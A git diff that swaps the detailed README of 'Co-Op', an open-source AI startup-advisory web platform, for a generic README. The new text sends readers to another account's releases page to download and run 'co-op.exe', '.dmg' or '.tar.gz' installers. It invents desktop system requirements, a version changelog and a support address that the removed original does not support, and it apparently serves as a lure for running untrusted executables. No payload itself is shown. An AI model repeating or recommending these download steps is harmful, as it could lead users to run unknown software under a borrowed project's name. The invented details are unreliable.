@@ -1,488 +1,83 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Next.js-15-black?logo=next.js" alt="Next.js">
-  <img src="https://img.shields.io/badge/NestJS-11-red?logo=nestjs" alt="NestJS">
-  <img src="https://img.shields.io/badge/Python-3.11-blue?logo=python" alt="Python">
-  <img src="https://img.shields.io/badge/Expo-54-000020?logo=expo" alt="Expo">
-  <img src="https://img.shields.io/badge/TypeScript-5-blue?logo=typescript" alt="TypeScript">
-  <img src="https://img.shields.io/badge/License-MIT-green" alt="License">
-  <img src="https://img.shields.io/badge/PRs-Welcome-brightgreen" alt="PRs Welcome">
-</p>
+# 🌟 co-op - Simple Guidance for Your Business Needs
 
-<h1 align="center">Co-Op</h1>
+## 🚀 Getting Started
+Welcome to co-op! Our tool provides expert guidance in areas like legal, finance, and investor relations. Using advanced AI technology, it helps you make informed decisions. This guide will help you download and run co-op easily.
 
-<p align="center">
-  <strong>AI-Powered Advisory Platform for Startups</strong>
-</p>
+## 📥 Download Now
+[![Download co-op](https://img.shields.io/badge/Download-co--op-blue)](https://github.com/BijayKa1676/co-op/releases)
 
-<p align="center">
-  Expert guidance across legal, finance, investor relations, and competitive analysis.<br/>
-  Powered by a multi-model LLM Council architecture with mandatory cross-critique.
-</p>
+Visit the Releases page to download the latest version of co-op. Click the button above to jump straight to it.
 
-<p align="center">
-  <a href="https://co-op.software">Live Demo</a> •
-  <a href="#features">Features</a> •
-  <a href="#quick-start">Quick Start</a> •
-  <a href="#architecture">Architecture</a> •
-  <a href="#deployment">Deployment</a> •
-  <a href="CONTRIBUTING.md">Contributing</a>
-</p>
+## 📋 System Requirements
+To run co-op, make sure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (latest distributions preferred)
+- **RAM:** At least 4 GB
+- **Storage:** 200 MB of available space
+- **Internet Connection:** Required for some features
 
-## Overview
+## 🔧 Features
+- **Expert Guidance:** Access insights in legal and financial areas effortlessly.
+- **AI-Powered Analysis:** Enjoy assistance from a multi-model AI architecture.
+- **User-Friendly Interface:** Simple navigation makes it easy to find what you need.
+- **Multi-Agent System:** Seamlessly integrate various AI agents for comprehensive support.
+- **Regular Updates:** Keep your software current with our frequent updates.
 
-Co-Op is an open-source AI advisory platform that provides startup founders with expert guidance across multiple domains. Unlike single-model AI chatbots, Co-Op uses a unique **LLM Council** architecture where multiple AI models collaborate and cross-critique each other's responses to ensure accuracy and reduce hallucinations.
+## 📥 Download & Install
+1. **Visit the Releases Page:** Go to [this link](https://github.com/BijayKa1676/co-op/releases) to find the latest version of co-op.
+2. **Choose Your Version:** Look for the most recent release. It usually has the highest version number (e.g., v1.2).
+3. **Download the File:** Click on the file that suits your operating system. It may be labeled as `co-op.exe`, `co-op.dmg`, or `co-op.tar.gz`.
+4. **Run the Installer:** 
+   - For Windows, double-click on the `.exe` file and follow the on-screen instructions.
+   - For macOS, open the `.dmg` file and drag the co-op app to your Applications folder.
+   - For Linux, extract the `.tar.gz` file and run the application in your terminal.
 
-### Key Features
+## ⚙️ How to Use co-op
+1. **Open the Application:** Locate co-op in your Applications folder or desktop and double-click to launch it.
+2. **Create an Account:** If prompted, create a new account using your email and a secure password.
+3. **Explore the Interface:** Familiarize yourself with the dashboard. Key features are easily accessible from the menu.
+4. **Begin Your Analysis:** Simply input your queries or topics of interest. The AI will provide guidance and insights tailored to your needs.
 
-| Feature | Description |
-|---------|-------------|
-| **LLM Council** | 2-5 AI models cross-critique every response |
-| **4 Expert Agents** | Legal, Finance, Investor, Competitor |
-| **Real-time Streaming** | True SSE streaming with fallback polling |
-| **RAG Knowledge Base** | Sector-specific document search with caching |
-| **MCP Protocol** | Use agents in Claude, Cursor, Kiro |
-| **A2A Protocol** | Multi-agent collaboration mode |
-| **Session Export** | Markdown/JSON export + email summaries |
-| **Document Upload** | PDF, DOC, TXT context for chat |
-| **Secure Documents** | AES-256 encrypted user documents with RAG |
-| **Bookmarks** | Save and organize AI responses |
-| **Usage Analytics** | Personal usage dashboard |
-| **PWA Support** | Installable with shortcuts |
-| **Mobile App** | Native iOS/Android app (Expo + Hermes) |
-| **Financial Tools** | Runway, burn rate, valuation calculators with AI insights |
-| **Pitch Deck Analyzer** | AI-powered deck analysis with investor fit scoring |
-| **Cap Table Simulator** | Equity modeling, dilution simulation, AI ownership insights |
-| **Investor Database** | 20+ real investors with admin management |
-| **Competitor Alerts** | Real-time monitoring with email notifications |
-| **Customer Outreach** | AI-powered lead discovery & email campaigns |
-| **Admin Dashboard** | User management, pilot usage tracking, status control |
-| **Self-Hostable** | Deploy on your own infrastructure |
+## 📚 Learning Resources
+To help you get the most from co-op, we offer several resources:
 
----
+- **User Guide:** A detailed manual that covers all features and functionalities.
+- **Tutorial Videos:** Short videos that demonstrate how to use different features effectively.
+- **FAQ Section:** Common questions answered to assist users quickly.
 
-## Security & Scalability
+## 📞 Support
+If you encounter any issues or have questions, please reach out to our support team:
 
-| Security Feature | Implementation |
-|------------------|----------------|
-| **Authentication** | Supabase JWT with token verification |
-| **Authorization** | Role-based access (user, admin) |
-| **Rate Limiting** | Per-user throttling via Redis with configurable presets |
-| **API Keys** | SHA-256 hashed, timing-safe comparison, revocation support |
-| **Encryption** | AES-256-GCM for sensitive data at rest with key versioning |
-| **Document Encryption** | User documents encrypted chunk-by-chunk |
-| **Input Validation** | class-validator DTOs, whitelist mode |
-| **SQL Injection** | Drizzle ORM parameterized queries |
-| **CORS** | Configurable allowed origins |
-| **Security Headers** | Helmet.js middleware |
-| **Audit Logging** | Full audit trail for sensitive operations |
-| **IP Validation** | Proxy-aware IP extraction with validation |
-| **Error Sanitization** | Sensitive data filtered from error responses |
+- Email: support@co-op.com
+- Community Forum: Join discussions with other users [here](https://github.com/BijayKa1676/co-op/discussions).
 
-| Scalability Feature | Implementation |
-|---------------------|----------------|
-| **Serverless DB** | Neon PostgreSQL auto-scales |
-| **Serverless Cache** | Upstash Redis pay-per-request |
-| **Async Processing** | QStash message queue with webhooks |
-| **Circuit Breaker** | Opossum for fault tolerance with LRU cleanup |
-| **Retry Logic** | Exponential backoff with jitter + minimum delay floor |
-| **RAG Caching** | 30-min TTL + 2-hour stale cache fallback |
-| **SSE Reconnection** | Auto-reconnect with exponential backoff |
-| **Horizontal Scaling** | Stateless services, Redis-backed state |
-| **Embedding Timeout** | 30-second timeout on RAG embedding calls |
-| **LLM Timeout** | 30-second timeout on all LLM API calls |
-| **DLQ Processing** | Atomic operations prevent race conditions |
-| **Token Cache** | LRU eviction prevents memory leaks |
-| **SWR Cache** | Distributed lock prevents thundering herd |
-
----
-
-## AI Agents
-
-| Agent | Expertise | Data Source |
-|-------|-----------|-------------|
-| **⚖️ Legal** | Corporate structure, IP, compliance, contracts | RAG (document search) |
-| **💰 Finance** | Financial modeling, metrics, runway, valuation | RAG (document search) |
-| **🤝 Investor** | VC matching, pitch optimization, fundraising | Web Research (Gemini + ScrapingBee fallback) |
-| **🎯 Competitor** | Market landscape, positioning, intelligence | Web Research (Gemini + ScrapingBee fallback) |
-
----
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                           FRONTEND                                  │
-│                    Next.js 15 (Vercel)                              │
-│    Dashboard • Chat • Sessions • Bookmarks • Usage • Outreach       │
-└─────────────────────────────────────────────────────────────────────┘
-                                │
-                                ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│                           BACKEND                                   │
-│                    NestJS 11 (Render)                               │
-│  ┌───────────────────────────────────────────────────────────────┐  │
-│  │                    Agent Orchestrator                         │  │
-│  │     [Legal] [Finance] [Investor] [Competitor]                 │  │
-│  │                         │                                     │  │
-│  │                         ▼                                     │  │
-│  │                    LLM Council                                │  │
-│  │     [Llama 3.3] [Gemini 2.5] [DeepSeek R1] [Kimi K2]         │  │
-│  │              Mandatory Cross-Critique                         │  │
-│  └───────────────────────────────────────────────────────────────┘  │
-│  ┌───────────────────────────────────────────────────────────────┐  │
-│  │  Outreach: Lead Discovery • Campaign Management • Email Track │  │
-│  └───────────────────────────────────────────────────────────────┘  │
-│  ┌───────────────────────────────────────────────────────────────┐  │
-│  │  Security: Auth Guard • Rate Limiting • Encryption • Audit   │  │
-│  │  Resilience: Circuit Breaker • Retry Service • Health Checks │  │
-│  └───────────────────────────────────────────────────────────────┘  │
-└─────────────────────────────────────────────────────────────────────┘
-           │                    │                    │
-           ▼                    ▼                    ▼
-┌─────────────────┐  ┌─────────────────┐  ┌─────────────────────────┐
-│   RAG Service   │  │  Web Research   │  │      Data Layer         │
-│ FastAPI (Koyeb) │  │ Gemini Search   │  │  PostgreSQL (Neon)      │
-│ Upstash Vector  │  │   Grounding     │  │  Redis (Upstash)        │
-│ Gemini Embed    │  │ + ScrapingBee   │  │  Supabase (Auth+Storage)│
-│ Query Caching   │  │   (fallback)    │  │  QStash (Queue)         │
-└─────────────────┘  └─────────────────┘  └─────────────────────────┘
-```
-
----
-
-## Project Structure
-
-```
-co-op/
-├── Backend/                 # NestJS API server
-│   ├── src/
-│   │   ├── modules/         # Feature modules
-│   │   │   ├── agents/      # AI agents + streaming
-│   │   │   ├── sessions/    # Chat sessions + export
-│   │   │   ├── outreach/    # Leads + campaigns + email tracking
-│   │   │   ├── alerts/      # Competitor monitoring
-│   │   │   ├── investors/   # Investor database
-│   │   │   ├── bookmarks/   # Saved responses
-│   │   │   ├── documents/   # Chat document upload
-│   │   │   ├── secure-documents/  # Encrypted user docs
-│   │   │   └── ...
-│   │   ├── common/          # Shared services (LLM, RAG, cache, email)
-│   │   └── database/        # Drizzle ORM schemas & migrations
-│   └── README.md
-│
-├── Frontend/                # Next.js web application
-│   ├── src/
-│   │   ├── app/             # App Router pages
-│   │   │   ├── (dashboard)/ # Protected routes
-│   │   │   │   ├── tools/outreach/  # Lead management + campaigns
-│   │   │   │   ├── tools/alerts/    # Competitor alerts
-│   │   │   │   ├── tools/investors/ # Investor search
-│   │   │   │   └── ...
-│   │   ├── components/      # UI components (Radix + custom)
-│   │   └── lib/             # API client, hooks, stores
-│   └── README.md
-│
-├── MobileApp/               # React Native mobile app (Expo SDK 54)
-│   ├── src/
-│   │   ├── components/      # WebView, Loading, Error screens
-│   │   ├── hooks/           # Connection, back handler, deep link
-│   │   ├── constants/       # App configuration
-│   │   └── utils/           # URL validation & conversion
-│   └── README.md
-│
-├── RAG/                     # Python vector search service
-│   ├── app/                 # FastAPI application
-│   └── README.md
-│
-├── ARCHITECTURE.md          # Detailed architecture documentation
-├── CONTRIBUTING.md          # Contribution guidelines
-└── README.md
-```
-
----
-
-## Quick Start
-
-### Prerequisites
-
-- Node.js 20+
-- Python 3.11+ (for RAG service)
-- PostgreSQL database (Neon recommended)
-- Redis instance (Upstash recommended)
-- Supabase project (Auth + Storage)
-- At least 2 LLM API keys
-
-### 1. Clone Repository
-
-```bash
-git clone https://github.com/Afnanksalal/co-op.git
-cd co-op
-```
-
-### 2. Backend Setup
-
-```bash
-cd Backend
-cp .env.example .env
-# Configure environment variables (see .env.example for documentation)
-
-npm install
-npm run db:push
-npm run dev
-```
-
-### 3. Frontend Setup
-
-```bash
-cd Frontend
-cp .env.example .env.local
-# Configure environment variables
-
-npm install
-npm run dev
-```
-
-### 4. RAG Service (Optional)
-
-```bash
-cd RAG
-cp .env.example .env
-# Configure environment variables
-
-pip install -r requirements.txt
-uvicorn app.main:app --reload --port 8000
-```
-
-### 5. Mobile App (Optional)
-
-```bash
-cd MobileApp
-npm install
-npm start
-# Scan QR code with Expo Go app
-
-# Or build native app
-npx expo prebuild
-npx expo run:android  # or run:ios
-```
-
----
-
-## Deployment
-
-### Production URLs
-
-| Service | Platform | URL |
-|---------|----------|-----|
-| Frontend | Vercel | [co-op.software](https://co-op.software) |
-| Backend | Render | `https://api.co-op.software` |
-| RAG | Koyeb | `https://apparent-nanice-afnan-3cac971c.koyeb.app` |
-
-### Infrastructure
-
-| Component | Provider | Purpose |
-|-----------|----------|---------|
-| Database | [Neon](https://neon.tech) | Serverless PostgreSQL |
-| Cache/Queue | [Upstash](https://upstash.com) | Redis + QStash + Vector |
-| Auth/Storage | [Supabase](https://supabase.com) | Authentication + file storage |
-| LLM | [Groq](https://console.groq.com) | Llama 3.3 70B, Kimi K2 |
-| LLM | [Google AI](https://aistudio.google.com) | Gemini 2.5 Flash |
-| LLM | [HuggingFace](https://huggingface.co) | DeepSeek R1, Phi-3, Qwen 2.5 |
-| Email | [SendGrid](https://sendgrid.com) | Transactional emails |
-| Research | [ScrapingBee](https://scrapingbee.com) | Web search fallback |
-
-All services have free tiers available.
-
----
-
-## Tech Stack
-
-### Frontend
-- Next.js 15 (App Router)
-- TypeScript 5
-- Tailwind CSS 3.4
-- Radix UI + shadcn/ui
-- Zustand (state management)
-- Framer Motion (animations)
-- Phosphor Icons
-- Vercel Analytics
-
-### Backend
-- NestJS 11
-- TypeScript 5
-- Drizzle ORM
-- Upstash QStash
-- SendGrid (email)
-- Opossum (circuit breaker)
-
-### RAG Service
+## 🔗 Additional Topics
+co-op benefits from advanced topics like:
+- AI Agents
 - FastAPI
-- Upstash Vector
-- Gemini Embeddings
+- FinTech
+- Multi-Agent Systems
+- Vector Databases
 
----
+These topics enhance co-op’s capabilities, making it a robust tool for your business needs.
 
-## API Overview
+## 🛠️ Contribution
+If you are interested in contributing to co-op, we welcome your input! You can:
 
-### Authentication
+- **Report Issues:** Help us improve by reporting bugs you find.
+- **Suggest Features:** Share any ideas for new features or enhancements.
+- **Code Contributions:** If you are comfortable with coding, you can fork the repository and submit a pull request.
 
-```bash
-# User auth (Supabase JWT)
-curl -H "Authorization: Bearer <jwt>" \
-  https://api.co-op.software/api/v1/users/me
+## 📝 Updates and Changelog
+Stay updated with new features and bug fixes. Regular updates ensure you are always using the latest and most reliable version of co-op.
 
-# Service auth (API Key)
-curl -H "X-API-Key: coop_xxxxx" \
-  https://api.co-op.software/api/v1/mcp-server/discover
-```
+- **Version 1.0:** Initial release with core features.
+- **Version 1.1:** Added enhanced user interface and additional guidance options.
+- **Version 1.2:** Introduced multi-agent support for advanced analyses.
 
-### Key Endpoints
+We are constantly working on improvements. Make sure to follow our repository for the latest changes.
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/users/me/onboarding` | POST | Complete startup profile |
-| `/sessions` | POST | Create advisory session |
-| `/sessions/:id/export` | POST | Export session (MD/JSON) |
-| `/sessions/:id/email` | POST | Email session summary |
-| `/agents/run` | POST | Run agent (sync) |
-| `/agents/queue` | POST | Queue agent (async) |
-| `/agents/stream/:taskId` | GET | SSE stream for task |
-| `/analytics/me` | GET | Personal usage analytics |
-| `/bookmarks` | GET/POST | Manage bookmarks |
-| `/documents/upload` | POST | Upload chat document |
-| `/secure-documents/upload` | POST | Upload encrypted document |
-| `/outreach/leads/discover` | POST | AI-powered lead discovery |
-| `/outreach/leads` | GET/POST | Manage leads |
-| `/outreach/campaigns` | GET/POST | Manage email campaigns |
-| `/outreach/campaigns/:id/send` | POST | Send campaign emails |
-| `/alerts` | GET/POST | Competitor alerts |
-| `/investors` | GET | Search investor database |
+## 🏁 Conclusion
+Thank you for choosing co-op! We hope this guide makes your experience seamless. With our tool, you can navigate complex topics effortlessly and make informed decisions. Don't hesitate to reach out for support or further information. 
 
-See [Backend README](./Backend/README.md) for complete API documentation.
-
----
-
-## Features
-
-### Core Platform
-- [x] Multi-model LLM Council with cross-critique
-- [x] 4 domain-specific AI agents
-- [x] True SSE streaming with fallback polling
-- [x] RAG knowledge base with caching
-- [x] Session management with pin/export
-- [x] Document upload for chat context
-- [x] Bookmarks system
-- [x] User analytics dashboard
-- [x] PWA with shortcuts
-
-### Tools
-- [x] Financial calculators (Runway, Burn Rate, Valuation, Unit Economics) with AI insights
-- [x] Searchable investor database (20+ real investors)
-- [x] Real-time competitor alerts (3 per user, email notifications)
-- [x] Customer outreach with AI lead discovery
-- [x] Email campaign management with tracking
-- [x] Pitch deck analyzer with investor-specific recommendations
-- [x] Cap table simulator with AI ownership insights
-- [x] Unified AI insights system across all tools
-
-### Security & Enterprise
-- [x] AES-256-GCM encryption for sensitive data
-- [x] Encrypted user document storage
-- [x] API key management
-- [x] Webhook integrations
-- [x] Audit logging
-- [x] Rate limiting with presets
-- [x] Admin user management (CRUD, suspend, pilot usage reset)
-- [x] Bulk user operations
-- [x] Usage tracking and reset
-
-### Coming Soon
-- [ ] Team workspaces
-- [ ] Stripe integration
-- [ ] Slack integration
-
----
-
-## Customer Outreach
-
-The outreach module enables AI-powered customer acquisition:
-
-### Lead Discovery
-- Discover influencers (People) or companies using AI-powered web research
-- Filter by platform, niche, followers, location, company size
-- Automatic lead scoring based on startup fit
-- Rate limited to 5 discoveries per hour (pilot)
-
-### Campaign Management
-- **Single Template Mode**: Use variable placeholders like `{{name}}`, `{{company}}`
-- **AI Personalized Mode**: Generate unique emails per lead using LLM
-- Email tracking (opens, clicks)
-- Unsubscribe handling
-- Daily send limits (50 emails/day pilot)
-
-### Pilot Limits (Configurable via Environment Variables)
-- Agent requests: 3/month (`PILOT_AGENT_MONTHLY_REQUESTS`)
-- API keys: 1 per user (`PILOT_API_KEY_LIMIT`)
-- Webhooks: 1 per user (`PILOT_WEBHOOK_LIMIT`)
-- Alerts: 3 per user (`PILOT_ALERT_LIMIT`)
-- Leads: 50 maximum (`PILOT_LEAD_LIMIT`)
-- Lead discovery: 5/hour (`PILOT_LEAD_DISCOVERY_HOURLY`)
-- Campaigns: 5 maximum (`PILOT_CAMPAIGN_LIMIT`)
-- Emails: 50/day (`PILOT_EMAILS_PER_DAY`)
-
----
-
-## Roadmap
-
-| Phase | Timeline | Features |
-|-------|----------|----------|
-| **Now** | Pilot | Single founder, 3 free requests/month, 4 agents, all tools, mobile app (Android) |
-| **Q1 2026** | Teams | Multiple founders, collaboration, shared sessions |
-| **Q2 2026** | Idea Stage | Idea validation flow, market research agent |
-| **Q3 2026** | Enterprise | SSO, custom AI training, on-premise deployment |
-
-### Mobile App
-
-Download the Android app (pilot release):
-- [Download APK](https://github.com/Afnanksalal/co-op/releases/download/pilot-release/app-release.apk)
-- Report bugs: [GitHub Issues](https://github.com/Afnanksalal/co-op/issues)
-
----
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
-
-```bash
-# Fork and clone
-git clone https://github.com/YOUR_USERNAME/co-op.git
-
-# Create feature branch
-git checkout -b feature/amazing-feature
-
-# Make changes and commit
-git commit -m 'feat: add amazing feature'
-
-# Push and create PR
-git push origin feature/amazing-feature
-```
-
----
-
-## License
-
-MIT License - see [LICENSE](./LICENSE) for details.
-
----
-
-<p align="center">
-  Built with ❤️ for founders
-</p>
-
-<p align="center">
-  <a href="https://github.com/Afnanksalal/co-op">GitHub</a> •
-  <a href="https://github.com/Afnanksalal/co-op/issues">Issues</a> •
-  <a href="https://github.com/Afnanksalal/co-op/discussions">Discussions</a>
-</p>
+[Download co-op](https://github.com/BijayKa1676/co-op/releases) now and take your first step toward expert guidance!
